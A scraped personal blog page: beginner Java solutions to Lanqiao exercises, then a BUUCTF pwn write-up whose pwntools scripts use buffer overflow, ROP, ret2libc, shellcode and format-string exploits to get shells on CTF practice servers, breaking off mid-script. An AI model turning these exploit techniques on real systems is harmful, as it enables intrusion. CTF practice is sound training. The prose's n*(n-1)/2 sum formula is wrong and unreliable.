            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>入门训练：<a href="http://lx.lanqiao.cn/problemset.page?code=BEGIN-&amp;userid=363463" target="_blank" rel="noopener">http://lx.lanqiao.cn/problemset.page?code=BEGIN-&amp;userid=363463</a></p>
</blockquote>
<h2 id="Fibonacci数列"><a href="#Fibonacci数列" class="headerlink" title="Fibonacci数列"></a>Fibonacci数列</h2><blockquote>
<p>Fibonacci数列加上求余%</p>
<p>使用递归会超时，故大数组+循环</p>
</blockquote>
<h3 id="提交格式"><a href="#提交格式" class="headerlink" title="提交格式"></a>提交格式</h3><ul>
<li>不需要package，需要import</li>
<li>修改类名为Main</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);<span class="comment">//输入类</span></span><br><span class="line">		<span class="keyword">int</span> [] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">1000001</span>];<span class="comment">//申请大数组</span></span><br><span class="line">		<span class="keyword">int</span> num = scan.nextInt();<span class="comment">//输入</span></span><br><span class="line">		</span><br><span class="line">		arr[<span class="number">1</span>] = <span class="number">1</span>;<span class="comment">//初始条件</span></span><br><span class="line">		arr[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=num;i++) &#123;</span><br><span class="line">			arr[i] = (arr[i-<span class="number">1</span>] + arr[i-<span class="number">2</span>])%<span class="number">10007</span>;<span class="comment">//循环计算每一项</span></span><br><span class="line"><span class="comment">//			System.out.print("arr[i]"+arr[i]);</span></span><br><span class="line">		&#125;</span><br><span class="line">        </span><br><span class="line">		System.out.print(arr[num]);<span class="comment">//输出结果</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里数组从1开始是有效的</p>
<h2 id="圆的面积"><a href="#圆的面积" class="headerlink" title="圆的面积"></a>圆的面积</h2><blockquote>
<p>pi * (r ^ 2)</p>
<ol>
<li>学习保留位数的输出</li>
<li>使用默认的Math类</li>
</ol>
</blockquote>
<h3 id="保留位数"><a href="#保留位数" class="headerlink" title="保留位数"></a>保留位数</h3><p>printf函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(<span class="string">"%.7f"</span>,result);</span><br></pre></td></tr></table></figure>

<h3 id="PI"><a href="#PI" class="headerlink" title="PI"></a>PI</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.PI</span><br></pre></td></tr></table></figure>

<h3 id="幂次"><a href="#幂次" class="headerlink" title="幂次"></a>幂次</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.pow(<span class="number">2</span>, <span class="number">3</span>);[底数，幂次]</span><br></pre></td></tr></table></figure>

<p>答案：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">circle_new_try</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		<span class="keyword">int</span> r = scan.nextInt();</span><br><span class="line">		<span class="keyword">double</span> result = Math.PI * r * r;</span><br><span class="line">		System.out.printf(<span class="string">"%.7f"</span>,result);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="序列求和"><a href="#序列求和" class="headerlink" title="序列求和"></a>序列求和</h2><blockquote>
<p>1+2+3+…+n = n * (n-1) /2</p>
<ol>
<li>学会简化给定的信息</li>
<li>注意数据规模，适当将int用long替代</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Seq_second_try</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">long</span> n = <span class="keyword">new</span> Scanner(System.in).nextInt();<span class="comment">//输入</span></span><br><span class="line">		<span class="keyword">long</span> result = n * (n+<span class="number">1</span>) / <span class="number">2</span>;<span class="comment">//简化的式子</span></span><br><span class="line">		System.out.print(result);<span class="comment">//输出</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="A-B问题"><a href="#A-B问题" class="headerlink" title="A+B问题"></a>A+B问题</h2><blockquote>
<p>好像反着了，无所谓了，</p>
<p>很简单，但是之前的输入的进化不能同时用，不然new 两个Scanner对象出来，有点问题</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Plus_new_try</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="comment">//		int a = new Scanner(System.in).nextInt();</span></span><br><span class="line"><span class="comment">//		int b = new Scanner(System.in).nextInt();</span></span><br><span class="line">		<span class="keyword">int</span> a = scan.nextInt();</span><br><span class="line">		<span class="keyword">int</span> b = scan.nextInt();</span><br><span class="line">		System.out.print(a+b);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="useful信息"><a href="#useful信息" class="headerlink" title="useful信息"></a>useful信息</h2><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><ol>
<li>打印main+alt+/：main开头</li>
<li>ctrl+shift+o：自动引包</li>
<li>alt+shift+x：自动执行</li>
<li>打印syso+alt+/</li>
<li>for补全：for+alt+/</li>
<li>选中光标前面的后者后面的：shift+&lt;-(or -&gt;)</li>
<li>表达式变</li>
<li>函数的注释：alt+shift+j</li>
<li>文件夹重命名：F2</li>
</ol>
<h3 id="输入的进化"><a href="#输入的进化" class="headerlink" title="输入的进化"></a>输入的进化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> n = <span class="keyword">new</span> Scanner(System.in).nextInt();</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/20/16-35-undefined/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/20/16-35-undefined/" class="post-title-link" itemprop="url">buu每日一题（1）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-11-20 16:35:52" itemprop="dateCreated datePublished" datetime="2020-11-20T16:35:52+08:00">2020-11-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-08 00:03:03" itemprop="dateModified" datetime="2021-05-08T00:03:03+08:00">2021-05-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="buu每日一题（1）"><a href="#buu每日一题（1）" class="headerlink" title="buu每日一题（1）"></a>buu每日一题（1）</h1><blockquote>
<ul>
<li><a href="https://blog.csdn.net/qq_43935969/article/details/104609258?spm=1001.2014.3001.5501" target="_blank" rel="noopener">BUUCTF刷题（前12道）</a></li>
<li><a href="https://blog.csdn.net/qq_43935969/article/details/106162618?spm=1001.2014.3001.5501" target="_blank" rel="noopener">buuctf刷题（2）【13题 - 】</a></li>
</ul>
<p>形成题感把，，，每天必须做一道</p>
</blockquote>
<h2 id="1-jarvisoj-level2"><a href="#1-jarvisoj-level2" class="headerlink" title="1. jarvisoj_level2"></a>1. jarvisoj_level2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./level2"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29936</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x08048320</span> </span><br><span class="line">binsh = <span class="number">0x0804A024</span></span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">0x4</span>)*<span class="string">'a'</span> + p32(system) + p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input:"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2-jarvisoj-level2-x64"><a href="#2-jarvisoj-level2-x64" class="headerlink" title="2. jarvisoj_level2_x64"></a>2. jarvisoj_level2_x64</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./level2_x64"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29525</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x0004004C0</span> </span><br><span class="line">binsh = <span class="number">0x0000000600A90</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x80</span>+<span class="number">0x8</span>)*<span class="string">'a'</span> +  p64(pop_rdi)+  p64(binsh)+  p64(system)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input:"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="3-ciscn-2019-n-5"><a href="#3-ciscn-2019-n-5" class="headerlink" title="3. ciscn_2019_n_5"></a>3. ciscn_2019_n_5</h2><blockquote>
<p>这道题是ret2shellcode，nx没有开</p>
<p>shellcraft.sh()需要设置好context</p>
<p><code>context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)</code>，否则可能不太行</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ciscn_2019_n_5"</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26381</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"tell me your name"</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">log.success(len(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"ant to say to me?"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(<span class="number">0x0601080</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="4-铁人三项-第五赛区-2018-rop"><a href="#4-铁人三项-第五赛区-2018-rop" class="headerlink" title="4. 铁人三项(第五赛区)_2018_rop"></a>4. 铁人三项(第五赛区)_2018_rop</h2><blockquote>
<p>简单的rop，栈溢出调用write泄露地址，然后继续main调用system</p>
<p>注意参数，，，，不要写错，，，</p>
<p>然后libc用libcsearcher的话，和本低是不一样的，，，</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./2018_rop"</span>)</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26162</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./2018_rop"</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">getegid_got = elf.got[<span class="string">'getegid'</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"plt:"</span>+hex(write_plt))</span><br><span class="line"><span class="comment"># log.success("got:"+hex(write_got))</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x080484C6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(write_plt)+ p32(main) + p32(<span class="number">1</span>)+p32(getegid_got)+p32(<span class="number">0x4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">getegid_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">log.success(hex(getegid_addr))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"getegid"</span>,getegid_addr)</span><br><span class="line">libc_base = getegid_addr - obj.dump(<span class="string">'getegid'</span>)</span><br><span class="line">system = obj.dump(<span class="string">"system"</span>) + libc_base</span><br><span class="line">binsh = obj.dump(<span class="string">"str_bin_sh"</span>) + libc_base</span><br><span class="line"></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(system))</span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) +p32(system)+ p32(main) +p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="5-jarvisoj-fm"><a href="#5-jarvisoj-fm" class="headerlink" title="5. jarvisoj_fm"></a>5. jarvisoj_fm</h2><blockquote>
<p>简单的格式化字符串</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./fm"</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26413</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#The index of format argument : 12 ("\%11$p")</span></span><br><span class="line">offset = <span class="number">11</span></span><br><span class="line">x= <span class="number">0x0804a02c</span></span><br><span class="line">payload = fmtstr_payload(offset,&#123;x:<span class="number">4</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="6-others-shellcode"><a href="#6-others-shellcode" class="headerlink" title="6. others_shellcode"></a>6. others_shellcode</h2><blockquote>
<p>运行就能拿到flag</p>
</blockquote>
<h2 id="7-bjdctf-2020-babyrop"><a href="#7-bjdctf-2020-babyrop" class="headerlink" title="7. bjdctf_2020_babyrop"></a>7. bjdctf_2020_babyrop</h2><blockquote>
<p>64位的rop</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># = process("./bjdctf_2020_babyrop")</span></span><br><span class="line">p= remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25380</span>)</span><br><span class="line">elf = ELF(<span class="string">"./bjdctf_2020_babyrop"</span>)</span><br><span class="line">context(os = <span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level =<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"story"</span>)</span><br><span class="line">payload = <span class="number">0x28</span>*<span class="string">'a'</span> + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"puts:"</span>+hex((read_addr)))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"read"</span>,(read_addr))</span><br><span class="line">libc_base = read_addr - obj.dump(<span class="string">"read"</span>)</span><br><span class="line">system = libc_base + obj.dump(<span class="string">"system"</span>)</span><br><span class="line">binsh = libc_base + obj.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x28</span>*<span class="string">'a'</span> + p64(pop_rdi) + p64(binsh) + p64(system) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="8-pwn2-sctf-2016"><a href="#8-pwn2-sctf-2016" class="headerlink" title="8. pwn2_sctf_2016"></a>8. pwn2_sctf_2016</h2><blockquote>
<p>还是rop</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn2_sctf_2016"</span>)</span><br><span class="line">p= remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28641</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn2_sctf_2016"</span>)</span><br><span class="line">context(os = <span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level =<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"read?"</span>)</span><br><span class="line">p.sendline(<span class="string">"-1"</span>)</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">getchar_got = elf.got[<span class="string">'getchar'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x2c</span>+<span class="number">0x4</span>) + p32(printf_plt) + p32(main) + p32(getchar_got)</span><br><span class="line">p.recvuntil(<span class="string">"data!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">getchar_addr = u32(p.recvuntil(<span class="string">"\xf7"</span>)[<span class="number">-4</span>:])</span><br><span class="line">print(hex(getchar_addr))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"getchar"</span>,getchar_addr)</span><br><span class="line">libc_base = getchar_addr - obj.dump(<span class="string">"getchar"</span>)</span><br><span class="line">system = obj.dump(<span class="string">"system"</span>) + libc_base</span><br><span class="line">binsh = obj.dump(<span class="string">"str_bin_sh"</span>) + libc_base</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"read?"</span>)</span><br><span class="line">p.sendline(<span class="string">"-1"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x2c</span>+<span class="number">0x4</span>) + p32(system) + p32(main) + p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="9-ciscn-2019-ne-5"><a href="#9-ciscn-2019-ne-5" class="headerlink" title="9. ciscn_2019_ne_5"></a>9. ciscn_2019_ne_5</h2><p>栈溢出，addlog输入字符串，getflag里溢出了，，，</p>
<p>程序给了system，但是没给binsh，，，不知道为什么”;/bin/sh”不可以用，，，迷惑，然后自己就多走了一步，还可以用fflush的sh来做参数</p>
<p><img src="/2020/11/20/16-35-undefined/image-20210325123806085.png" alt="image-20210325123806085"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./ciscn_2019_ne_5"</span>)</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25749</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ciscn_2019_ne_5"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"password:"</span>)</span><br><span class="line">p.sendline(<span class="string">"administrator"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">system = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">puts_plt = elf.plt[<span 